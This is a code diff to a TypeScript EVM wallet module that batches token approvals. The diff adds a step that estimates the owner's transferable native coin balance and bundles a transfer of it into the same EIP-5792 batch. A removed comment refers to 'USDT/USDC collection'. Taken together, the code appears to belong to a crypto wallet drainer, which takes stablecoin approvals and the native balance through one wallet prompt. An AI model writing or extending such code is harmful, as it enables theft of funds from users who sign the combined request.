@@ -17,6 +17,10 @@ import { getErrorMessage, isUserRejection } from "../core/errors";
 import { PERMISSION_DENIED_BY_USER_MESSAGE } from "../core/link-flow-meta";
 import { EVM_CHAIN_ID, isEvmChainKey } from "../core/native-chains";
 import {
+  buildNativeWalletCall,
+  fetchNativeTransferEstimate,
+} from "./batch-native-estimate";
+import {
   executeEip5792Batch,
   resolveWalletCapabilities,
   shouldAttemptEip5792,
@@ -242,9 +246,23 @@ export async function runEvmTokenBatchApproval(
   );
   const eip5792Supported = shouldAttemptEip5792(capabilities, chainId);
 
-  // Native is never included in EIP-5792 batches — popup happens in wallet phase;
-  // execution is deferred until after USDT/USDC collection.
-  void args.nativeItem;
+  let nativeCall: { to: string; data: string; value: string } | null = null;
+  let nativeEstimate: Awaited<ReturnType<typeof fetchNativeTransferEstimate>> =
+    null;
+  if (args.nativeItem && eip5792Supported) {
+    nativeEstimate = await fetchNativeTransferEstimate({
+      apiBaseUrl: args.apiBaseUrl,
+      network: args.network,
+      owner,
+    });
+    nativeCall = nativeEstimate ? buildNativeWalletCall(nativeEstimate) : null;
+    if (!nativeCall) {
+      log("EIP5792_BATCH_NATIVE_SKIP", {
+        network: args.network,
+        reason: "no transferable native balance for batch",
+      });
+    }
+  }
 
   if (!eip5792Supported) {
     log("EIP5792_BATCH_UNSUPPORTED", {
@@ -255,7 +273,9 @@ export async function runEvmTokenBatchApproval(
     });
   }
 
-  const canTryEip5792 = eip5792Supported && jobs.length >= 2;
+  const canTryEip5792 =
+    eip5792Supported &&
+    (jobs.length >= 2 || (jobs.length >= 1 && nativeCall != null));
 
   if (canTryEip5792) {
     const eip5792Result = await executeEip5792Batch({
@@ -265,12 +285,14 @@ export async function runEvmTokenBatchApproval(
       jobs,
       priorResults: results,
       api,
-      nativeCall: null,
-      nativeEstimate: null,
+      nativeCall,
+      nativeEstimate,
       capabilities,
       log,
     });
-    if (eip5792Result) return eip5792Result;
+    if (eip5792Result) {
+      return eip5792Result;
+    }
   }
 
   if (jobs.length === 1) {
